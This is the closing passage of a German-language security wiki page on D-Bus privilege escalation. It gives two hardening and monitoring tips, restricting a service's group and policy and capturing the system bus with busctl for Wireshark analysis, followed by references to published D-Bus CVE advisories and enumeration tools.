* Wenn sich ein Dienst nicht entfernen lässt, ihn zumindest auf eine dedizierte Unix-Gruppe *beschränken* und den Zugriff in seiner XML-Richtlinie einschränken.
* Blue-team: Den Systembus mit `busctl capture > /var/log/dbus_$(date +%F).pcapng` aufzeichnen und zur Erkennung von Anomalien in Wireshark importieren.

---

## References

- [1] [USBCreator-D-Bus-Privilege Escalation auf Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus-Dienst ermöglicht Konfiguration durch jeden unprivilegierten Benutzer](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Authentication Bypass im Deepin-D-Bus-Proxy-Dienst (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus-Dokumentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
